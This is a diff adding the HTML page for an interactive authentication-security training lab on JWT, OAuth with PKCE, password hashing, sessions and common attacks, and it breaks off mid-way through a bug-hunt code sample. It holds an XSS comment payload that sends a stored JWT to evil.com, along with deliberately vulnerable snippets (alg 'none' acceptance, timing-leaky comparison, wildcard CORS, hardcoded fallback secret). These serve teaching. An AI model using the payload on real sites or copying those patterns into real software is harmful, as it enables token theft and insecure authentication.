@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>AuthMastery Lab - JavaScript Security Mastery</title>
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --bg-tertiary: #334155;
+            --accent-primary: #3b82f6;
+            --accent-success: #10b981;
+            --accent-danger: #ef4444;
+            --accent-warning: #f59e0b;
+            --text-primary: #f8fafc;
+            --text-secondary: #cbd5e1;
+            --text-muted: #64748b;
+            --border: #475569;
+            --font-mono: 'Fira Code', 'Consolas', monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Layout */
+        .app-container {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border);
+            padding: 1.5rem;
+            position: sticky;
+            top: 0;
+            height: 100vh;
+            overflow-y: auto;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, var(--accent-primary), #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-section {
+            margin-bottom: 2rem;
+        }
+
+        .nav-title {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            color: var(--text-muted);
+            margin-bottom: 0.5rem;
+            letter-spacing: 0.05em;
+        }
+
+        .nav-item {
+            padding: 0.75rem 1rem;
+            margin-bottom: 0.25rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 0.9rem;
+        }
+
+        .nav-item:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .nav-item.active {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        .nav-item.locked {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .badge {
+            font-size: 0.7rem;
+            padding: 0.2rem 0.5rem;
+            border-radius: 999px;
+            background: var(--bg-tertiary);
+        }
+
+        .nav-item.active .badge {
+            background: rgba(255,255,255,0.2);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            margin-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 1rem;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: var(--bg-secondary);
+            border-radius: 4px;
+            margin-top: 1rem;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-primary), #8b5cf6);
+            transition: width 0.3s;
+        }
+
+        /* Module Sections */
+        .module {
+            display: none;
+            animation: fadeIn 0.3s;
+        }
+
+        .module.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cards */
+        .card {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .card-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        /* Interactive Elements */
+        .code-playground {
+            background: #1a1a2e;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin: 1rem 0;
+            border: 1px solid #2d3748;
+        }
+
+        .playground-toolbar {
+            background: #16213e;
+            padding: 0.5rem 1rem;
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+            border-bottom: 1px solid #2d3748;
+        }
+
+        .playground-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        textarea.code-input {
+            width: 100%;
+            min-height: 200px;
+            background: transparent;
+            border: none;
+            color: #a5b3ce;
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            padding: 1rem;
+            resize: vertical;
+            line-height: 1.5;
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #2563eb;
+            transform: translateY(-1px);
+        }
+
+        .btn-success {
+            background: var(--accent-success);
+            color: white;
+        }
+
+        .btn-danger {
+            background: var(--accent-danger);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+        }
+
+        /* JWT Visualizer */
+        .jwt-visualizer {
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            line-height: 1.8;
+            padding: 1rem;
+            background: #1a1a2e;
+            border-radius: 0.5rem;
+            word-break: break-all;
+        }
+
+        .jwt-header { color: #f87171; }
+        .jwt-payload { color: #60a5fa; }
+        .jwt-signature { color: #34d399; }
+
+        /* OAuth Flow */
+        .oauth-flow {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            position: relative;
+        }
+
+        .flow-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-tertiary);
+            border-radius: 0.5rem;
+            border-left: 4px solid var(--accent-primary);
+            transition: all 0.3s;
+        }
+
+        .flow-step.active {
+            background: rgba(59, 130, 246, 0.1);
+            border-left-color: var(--accent-success);
+            transform: translateX(10px);
+        }
+
+        .flow-arrow {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 1.5rem;
+        }
+
+        /* Quiz */
+        .quiz-option {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            margin-bottom: 0.5rem;
+            background: var(--bg-tertiary);
+            border: 2px solid transparent;
+            border-radius: 0.5rem;
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: var(--text-primary);
+        }
+
+        .quiz-option:hover {
+            border-color: var(--accent-primary);
+            transform: translateX(5px);
+        }
+
+        .quiz-option.correct {
+            background: rgba(16, 185, 129, 0.2);
+            border-color: var(--accent-success);
+        }
+
+        .quiz-option.wrong {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: var(--accent-danger);
+        }
+
+        .explanation {
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 0.5rem;
+            border-left: 4px solid var(--accent-primary);
+            display: none;
+        }
+
+        /* Security Scanner */
+        .code-vulnerability {
+            position: relative;
+            cursor: pointer;
+        }
+
+        .vuln-highlight {
+            background: rgba(239, 68, 68, 0.3);
+            border-bottom: 2px wavy var(--accent-danger);
+            cursor: help;
+        }
+
+        .tooltip {
+            position: absolute;
+            background: var(--bg-secondary);
+            border: 1px solid var(--accent-danger);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            z-index: 100;
+            max-width: 300px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            display: none;
+        }
+
+        /* Hashing Demo */
+        .hash-comparison {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .hash-box {
+            padding: 1rem;
+            background: var(--bg-tertiary);
+            border-radius: 0.5rem;
+            border: 2px solid transparent;
+        }
+
+        .hash-box.weak {
+            border-color: var(--accent-danger);
+        }
+
+        .hash-box.strong {
+            border-color: var(--accent-success);
+        }
+
+        /* Animations */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        .modal-content {
+            background: var(--bg-secondary);
+            padding: 2rem;
+            border-radius: 1rem;
+            max-width: 600px;
+            width: 90%;
+            border: 1px solid var(--border);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .app-container {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                display: none;
+            }
+        }
+
+        /* Console Output */
+        .console-output {
+            background: #0a0a0a;
+            color: #4ade80;
+            padding: 1rem;
+            font-family: var(--font-mono);
+            font-size: 0.85rem;
+            border-radius: 0 0 0.5rem 0.5rem;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .console-line.error { color: #ef4444; }
+        .console-line.warn { color: #f59e0b; }
+        .console-line.info { color: #60a5fa; }
+
+        /* Difficulty badges */
+        .difficulty {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.25rem;
+            padding: 0.25rem 0.75rem;
+            border-radius: 999px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .difficulty.junior { background: rgba(16, 185, 129, 0.2); color: var(--accent-success); }
+        .difficulty.mid { background: rgba(245, 158, 11, 0.2); color: var(--accent-warning); }
+        .difficulty.senior { background: rgba(239, 68, 68, 0.2); color: var(--accent-danger); }
+
+        /* XP Bar */
+        .xp-container {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            background: var(--bg-secondary);
+            padding: 0.5rem 1rem;
+            border-radius: 999px;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            z-index: 100;
+        }
+
+        .xp-bar {
+            width: 100px;
+            height: 6px;
+            background: var(--bg-tertiary);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .xp-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #fbbf24, #f59e0b);
+            width: 0%;
+            transition: width 0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="xp-container">
+        <span>🔥</span>
+        <div class="xp-bar">
+            <div class="xp-fill" id="xpFill"></div>
+        </div>
+        <span id="xpText">0 XP</span>
+    </div>
+
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="logo">🛡️ AuthMastery</div>
+            
+            <div class="nav-section">
+                <div class="nav-title">Fundamentals</div>
+                <div class="nav-item active" onclick="showModule('jwt')">
+                    JWT Deep Dive
+                    <span class="badge">1</span>
+                </div>
+                <div class="nav-item" onclick="showModule('oauth')">
+                    OAuth & OIDC
+                    <span class="badge">2</span>
+                </div>
+                <div class="nav-item" onclick="showModule('hashing')">
+                    Password Hashing
+                    <span class="badge">3</span>
+                </div>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Advanced</div>
+                <div class="nav-item" onclick="showModule('sessions')">
+                    Session Management
+                    <span class="badge">4</span>
+                </div>
+                <div class="nav-item" onclick="showModule('security')">
+                    Attack Vectors
+                    <span class="badge">5</span>
+                </div>
+                <div class="nav-item" onclick="showModule('architecture')">
+                    System Design
+                    <span class="badge">6</span>
+                </div>
+            </div>
+
+            <div class="nav-section">
+                <div class="nav-title">Practice</div>
+                <div class="nav-item" onclick="showModule('bug-hunt')">
+                    🐛 Bug Hunt
+                    <span class="badge">Quiz</span>
+                </div>
+                <div class="nav-item" onclick="showModule('final')">
+                    🏆 Final Challenge
+                    <span class="badge">Boss</span>
+                </div>
+            </div>
+
+            <div class="nav-section" style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid var(--border);">
+                <div class="nav-title">Progress</div>
+                <div style="font-size: 0.9rem; color: var(--text-secondary);">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                        <span>Modules Complete</span>
+                        <span id="progressText">0/7</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span>Current Rank</span>
+                        <span style="color: var(--accent-primary); font-weight: bold;">Script Kiddie</span>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <main class="main-content">
+            <!-- JWT MODULE -->
+            <div id="jwt" class="module active">
+                <div class="header">
+                    <h1>JWT (JSON Web Tokens) Mastery</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Understand the anatomy, implementation, and catastrophic mistakes of JWTs.
+                        <span class="difficulty mid">Mid-Level</span>
+                    </p>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: 0%"></div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🔬 JWT Anatomy Lab</h3>
+                        <button class="btn btn-secondary" onclick="generateSampleJWT()">Generate New Token</button>
+                    </div>
+                    <p style="margin-bottom: 1rem; color: var(--text-secondary);">
+                        JWTs are not encrypted - they are encoded. Anyone can read the payload. Never store sensitive data in a JWT unless encrypted (JWE).
+                    </p>
+                    
+                    <div class="jwt-visualizer" id="jwtVisualizer">
+                        <span class="jwt-header">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.
+                        <span class="jwt-payload">eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MDAwMDAwMDB9</span>.
+                        <span class="jwt-signature">SflKxwRJSMeKKF2QT4fwpMe...</span>
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; margin-top: 1.5rem;">
+                        <div style="padding: 1rem; background: rgba(248, 113, 113, 0.1); border-radius: 0.5rem; border-left: 4px solid #f87171;">
+                            <strong style="color: #f87171; display: block; margin-bottom: 0.5rem;">HEADER (Red)</strong>
+                            <code id="jwtHeader" style="font-size: 0.85rem; color: var(--text-secondary);">{"alg":"HS256","typ":"JWT"}</code>
+                        </div>
+                        <div style="padding: 1rem; background: rgba(96, 165, 250, 0.1); border-radius: 0.5rem; border-left: 4px solid #60a5fa;">
+                            <strong style="color: #60a5fa; display: block; margin-bottom: 0.5rem;">PAYLOAD (Blue)</strong>
+                            <code id="jwtPayload" style="font-size: 0.85rem; color: var(--text-secondary);">{"user":"admin","role":"admin"}</code>
+                        </div>
+                        <div style="padding: 1rem; background: rgba(52, 211, 153, 0.1); border-radius: 0.5rem; border-left: 4px solid #34d399;">
+                            <strong style="color: #34d399; display: block; margin-bottom: 0.5rem;">SIGNATURE (Green)</strong>
+                            <code style="font-size: 0.85rem; color: var(--text-secondary);">HMACSHA256(base64Url(header) + "." + base64Url(payload), secret)</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">⚠️ The "None" Algorithm Attack</h3>
+                        <span class="difficulty senior">Senior Trap</span>
+                    </div>
+                    <p style="margin-bottom: 1rem;">
+                        One of the most dangerous vulnerabilities: If a server accepts "alg": "none", attackers can forge tokens. This happened to Firebase and Auth0 in early implementations.
+                    </p>
+
+                    <div class="code-playground">
+                        <div class="playground-toolbar">
+                            <span class="playground-dot dot-red"></span>
+                            <span class="playground-dot dot-yellow"></span>
+                            <span class="playground-dot dot-green"></span>
+                            <span style="margin-left: auto; color: var(--text-muted); font-size: 0.85rem;">vulnerable-server.js</span>
+                        </div>
+                        <textarea class="code-input" id="vulnCode">function verifyToken(token) {
+    const [headerB64, payloadB64, signature] = token.split('.');
+    const header = JSON.parse(atob(headerB64));
+    
+    // 🚨 CRITICAL VULNERABILITY: Trusting client-side algorithm
+    if (header.alg === 'none') {
+        return JSON.parse(atob(payloadB64)); // No verification!
+    }
+    
+    return crypto.verify(header.alg, signature, SECRET, 
+        headerB64 + '.' + payloadB64);
+}</textarea>
+                        <div style="padding: 0.5rem 1rem; background: var(--bg-tertiary); border-top: 1px solid var(--border);">
+                            <button class="btn btn-danger" onclick="exploitNoneAlg()">🔥 Exploit Vulnerability</button>
+                            <button class="btn btn-success" onclick="fixNoneAlg()" style="margin-left: 0.5rem;">✅ Fix Code</button>
+                        </div>
+                        <div class="console-output" id="vulnConsole">Click "Exploit" to see the attack...</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🧠 Knowledge Check: JWT Storage</h3>
+                    </div>
+                    <p>Where should you store JWTs in the browser for a secure SPA?</p>
+                    
+                    <button class="quiz-option" onclick="checkAnswer(this, false)">
+                        A) localStorage - Easy to access from JavaScript
+                    </button>
+                    <button class="quiz-option" onclick="checkAnswer(this, false)">
+                        B) sessionStorage - Clears when tab closes, so it's safe
+                    </button>
+                    <button class="quiz-option" onclick="checkAnswer(this, true)">
+                        C) httpOnly, Secure, SameSite=Strict cookies - Inaccessible to JavaScript
+                    </button>
+                    <button class="quiz-option" onclick="checkAnswer(this, false)">
+                        D) IndexedDB - More storage space than localStorage
+                    </button>
+
+                    <div class="explanation" id="jwtExplanation">
+                        <strong>Correct!</strong> While localStorage is convenient, it's vulnerable to XSS attacks. Any script can steal it with <code>localStorage.getItem('token')</code>.
+                        <br><br>
+                        <strong>Senior Engineer Note:</strong> Even with httpOnly cookies, you need CSRF protection for state-changing operations. Consider Double Submit Cookie pattern or Synchronizer Token Pattern.
+                    </div>
+                </div>
+            </div>
+
+            <!-- OAUTH MODULE -->
+            <div id="oauth" class="module">
+                <div class="header">
+                    <h1>OAuth 2.0 & OIDC Flows</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Master the Authorization Code flow, PKCE, and why Implicit flow is deprecated.
+                        <span class="difficulty senior">Senior Level</span>
+                    </p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🔄 Interactive Flow: Authorization Code + PKCE</h3>
+                        <button class="btn btn-primary" onclick="nextFlowStep()">Next Step →</button>
+                    </div>
+                    
+                    <div class="oauth-flow" id="oauthFlow">
+                        <div class="flow-step active" data-step="1">
+                            <div style="font-size: 2rem;">📱</div>
+                            <div>
+                                <strong>1. Client Initiates</strong>
+                                <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                    Generates PKCE: code_verifier (random secret) and code_challenge (hash of verifier)
+                                </p>
+                                <code style="display: block; margin-top: 0.5rem; padding: 0.5rem; background: rgba(0,0,0,0.3); border-radius: 0.25rem;">
+                                    GET /auth?response_type=code&client_id=xyz&redirect_uri=...&code_challenge=ABC123&code_challenge_method=S256
+                                </code>
+                            </div>
+                        </div>
+                        <div class="flow-step" data-step="2">
+                            <div style="font-size: 2rem;">👤</div>
+                            <div>
+                                <strong>2. User Authenticates</strong>
+                                <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                    Authorization Server validates credentials, redirects with authorization code
+                                </p>
+                            </div>
+                        </div>
+                        <div class="flow-step" data-step="3">
+                            <div style="font-size: 2rem;">🔄</div>
+                            <div>
+                                <strong>3. Token Exchange</strong>
+                                <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                    Client sends code + code_verifier (proof of possession)
+                                </p>
+                                <code style="display: block; margin-top: 0.5rem; padding: 0.5rem; background: rgba(0,0,0,0.3); border-radius: 0.25rem;">
+                                    POST /token {code: "...", code_verifier: "secret_plaintext", grant_type: "authorization_code"}
+                                </code>
+                            </div>
+                        </div>
+                        <div class="flow-step" data-step="4">
+                            <div style="font-size: 2rem;">✅</div>
+                            <div>
+                                <strong>4. Tokens Issued</strong>
+                                <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                    Server hashes code_verifier, compares to code_challenge. Issues access_token + refresh_token
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🎯 Common OAuth Pitfalls</h3>
+                    </div>
+                    
+                    <div style="display: grid; gap: 1rem;">
+                        <div style="padding: 1rem; background: rgba(239, 68, 68, 0.1); border-left: 4px solid var(--accent-danger); border-radius: 0.25rem;">
+                            <strong style="color: var(--accent-danger);">❌ Missing State Parameter</strong>
+                            <p style="font-size: 0.9rem; margin-top: 0.5rem; color: var(--text-secondary);">
+                                Without <code>state</code> (random nonce), your app is vulnerable to CSRF attacks. Attacker can force victim to login with attacker's account.
+                            </p>
+                        </div>
+                        
+                        <div style="padding: 1rem; background: rgba(239, 68, 68, 0.1); border-left: 4px solid var(--accent-danger); border-radius: 0.25rem;">
+                            <strong style="color: var(--accent-danger);">❌ Wildcard Redirect URIs</strong>
+                            <p style="font-size: 0.9rem; margin-top: 0.5rem; color: var(--text-secondary);">
+                                Allowing <code>*.example.com</code> is dangerous. Attacker can register <code>evil.example.com.attacker.com</code> or exploit subdomain takeover.
+                            </p>
+                        </div>
+
+                        <div style="padding: 1rem; background: rgba(245, 158, 11, 0.1); border-left: 4px solid var(--accent-warning); border-radius: 0.25rem;">
+                            <strong style="color: var(--accent-warning);">⚠️ Implicit Flow (Deprecated)</strong>
+                            <p style="font-size: 0.9rem; margin-top: 0.5rem; color: var(--text-secondary);">
+                                Returns token in URL fragment (#). Leaked in browser history, referrer headers, and server logs. Use Authorization Code + PKCE even for SPAs.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- HASHING MODULE -->
+            <div id="hashing" class="module">
+                <div class="header">
+                    <h1>Cryptographic Hashing</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Why SHA256 is wrong for passwords, importance of salt, and timing attacks.
+                        <span class="difficulty mid">Mid-Level</span>
+                    </p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🔑 Live Hashing Comparison</h3>
+                    </div>
+                    <p>Type a password to see why fast hashes are dangerous:</p>
+                    <input type="text" id="passwordInput" placeholder="Enter password..." 
+                           style="width: 100%; padding: 0.75rem; margin: 1rem 0; background: var(--bg-tertiary); border: 1px solid var(--border); color: white; border-radius: 0.375rem;">
+                    
+                    <div class="hash-comparison">
+                        <div class="hash-box weak">
+                            <strong style="color: var(--accent-danger);">❌ SHA-256 (Fast)</strong>
+                            <div style="font-family: monospace; font-size: 0.8rem; margin-top: 0.5rem; word-break: break-all;" id="sha256Hash">...</div>
+                            <div style="margin-top: 0.5rem; font-size: 0.85rem; color: var(--text-secondary);">
+                                ~3 billion ops/sec on GPU<br>
+                                Vulnerable to rainbow tables
+                            </div>
+                        </div>
+                        <div class="hash-box strong">
+                            <strong style="color: var(--accent-success);">✅ bcrypt (Adaptive)</strong>
+                            <div style="font-family: monospace; font-size: 0.8rem; margin-top: 0.5rem; word-break: break-all;" id="bcryptHash">...</div>
+                            <div style="margin-top: 0.5rem; font-size: 0.85rem; color: var(--text-secondary);">
+                                Cost factor: 12<br>
+                                ~10 hashes/sec (intentionally slow)
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">⏱️ Timing Attack Demonstration</h3>
+                    </div>
+                    <p>Compare these two password comparison methods. One leaks information through timing:</p>
+                    
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
+                        <div class="code-playground">
+                            <div class="playground-toolbar">
+                                <span style="color: var(--text-muted);">vulnerable.js</span>
+                            </div>
+                            <pre style="padding: 1rem; font-family: var(--font-mono); font-size: 0.85rem; color: #a5b3ce;">
+function checkPassword(input, hash) {
+    // Early return on mismatch = timing leak!
+    for (let i = 0; i < input.length; i++) {
+        if (input[i] !== hash[i]) return false;
+    }
+    return true;
+}</pre>
+                        </div>
+                        <div class="code-playground">
+                            <div class="playground-toolbar">
+                                <span style="color: var(--text-muted);">secure.js</span>
+                            </div>
+                            <pre style="padding: 1rem; font-family: var(--font-mono); font-size: 0.85rem; color: #a5b3ce;">
+import { timingSafeEqual } from 'crypto';
+
+function checkPassword(input, hash) {
+    // Constant-time comparison
+    try {
+        return timingSafeEqual(
+            Buffer.from(input), 
+            Buffer.from(hash)
+        );
+    } catch {
+        return false; // Different lengths
+    }
+}</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SESSIONS MODULE -->
+            <div id="sessions" class="module">
+                <div class="header">
+                    <h1>Session Management Architecture</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Stateless (JWT) vs Stateful (Sessions), rotation strategies, and revocation.
+                        <span class="difficulty senior">Senior Level</span>
+                    </p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🍪 Cookie Security Flags</h3>
+                    </div>
+                    
+                    <div style="background: var(--bg-tertiary); padding: 1rem; border-radius: 0.5rem; font-family: var(--font-mono); margin-bottom: 1rem;">
+                        Set-Cookie: sessionId=<span style="color: #f59e0b;">abc123</span>; 
+                        <span style="color: #60a5fa;">HttpOnly</span>; 
+                        <span style="color: #34d399;">Secure</span>; 
+                        <span style="color: #a78bfa;">SameSite=Strict</span>; 
+                        <span style="color: #f87171;">Max-Age=3600</span>
+                    </div>
+
+                    <div style="display: grid; gap: 1rem;">
+                        <div style="padding: 1rem; border: 1px solid var(--border); border-radius: 0.5rem;">
+                            <strong style="color: #60a5fa;">HttpOnly</strong>
+                            <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                Prevents JavaScript access via <code>document.cookie</code>. Essential for XSS protection.
+                            </p>
+                        </div>
+                        <div style="padding: 1rem; border: 1px solid var(--border); border-radius: 0.5rem;">
+                            <strong style="color: #34d399;">Secure</strong>
+                            <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                Cookie sent only over HTTPS. Prevents man-in-the-middle interception.
+                            </p>
+                        </div>
+                        <div style="padding: 1rem; border: 1px solid var(--border); border-radius: 0.5rem;">
+                            <strong style="color: #a78bfa;">SameSite=Strict</strong>
+                            <p style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 0.25rem;">
+                                Cookie not sent on cross-site requests. Blocks CSRF attacks but may break UX on external links.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">🔄 Refresh Token Rotation</h3>
+                        <span class="difficulty senior">Advanced Pattern</span>
+                    </div>
+                    <p>When to use Refresh Tokens vs Short-lived Access Tokens:</p>
+                    <ul style="margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary);">
+                        <li>Access Tokens: 15 minutes (stateless JWT)</li>
+                        <li>Refresh Tokens: 7-30 days (stored in DB/redis for revocation)</li>
+                        <li>On refresh: Issue new access token + NEW refresh token (refresh token rotation)</li>
+                        <li>Detect refresh token reuse (stolen token detection)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- SECURITY MODULE -->
+            <div id="security" class="module">
+                <div class="header">
+                    <h1>Attack Vectors & Defenses</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        XSS, CSRF, Clickjacking, and IDOR - with live demonstrations.
+                    </p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">💉 XSS (Cross-Site Scripting) Simulation</h3>
+                    </div>
+                    <p>See how an attacker steals your JWT from localStorage:</p>
+                    
+                    <div style="background: var(--bg-tertiary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0;">
+                        <div style="margin-bottom: 0.5rem; color: var(--text-muted);">Comment Input:</div>
+                        <code style="color: #f87171;">&lt;script&gt;fetch('https://evil.com/steal?token='+localStorage.getItem('jwt'))&lt;/script&gt;</code>
+                    </div>
+
+                    <button class="btn btn-danger" onclick="simulateXSS()">Simulate Attack</button>
+                    <div id="xssResult" style="margin-top: 1rem; padding: 1rem; background: rgba(239, 68, 68, 0.1); border-radius: 0.5rem; display: none;">
+                        🔴 Token stolen and sent to attacker server!
+                    </div>
+                </div>
+            </div>
+
+            <!-- BUG HUNT MODULE -->
+            <div id="bug-hunt" class="module">
+                <div class="header">
+                    <h1>🐛 Bug Hunt: Find the Vulnerabilities</h1>
+                    <p style="color: var(--text-secondary); margin-top: 0.5rem;">
+                        Spot the security issues in real-world code snippets. 5 bugs to find.
+                    </p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="card-title">Challenge 1/5: The Login Endpoint</h3>
+                        <span class="difficulty mid">Mid Level</span>
+                    </div>
+                    <p>Click on the vulnerable lines in this Express.js authentication code:</p>
+                    
+                    <div class="code-playground" style="margin-top: 1rem;">
+                        <pre style="padding: 1rem; font-family: var(--font-mono); font-size: 0.9rem; line-height: 2;">
+<span style="color: #64748b;">1</span>  <span class="code-vulnerability" onclick="foundBug(this, 'CORS')">app.use(cors({ origin: '*' }));</span>
+<span style="color: #64748b;">2</span>  
+<span style="color: #64748b;">3</span>  app.post('/login', async (req, res) => {
+<span style="color: #64748b;">4</span>    const { email, password } = req.body;
+<span style="color: #64748b;">5</span>    const user = await User.findOne({ email });
+<span style="color: #64748b;">6</span>    
+<span style="color: #64748b;">7</span>    <span class="code-vulnerability" onclick="foundBug(this, 'timing')">if (user.password === hash(password))</span> {
+<span style="color: #64748b;">8</span>      const token = jwt.sign(
+<span style="color: #64748b;">9</span>        { userId: user._id }, 
+<span style="color: #64748b;">10</span>       <span class="code-vulnerability" onclick="foundBug(this, 'secret')">process.env.JWT_SECRET || 'dev-secret-key'</span>,
+<span style="color: #64748b;">11</span>       { expiresIn: '30d' }
+<span style="color: #64748b;">12</span>     );
+<span style="color: #64748b;">13</span>     res.json({ token, user });
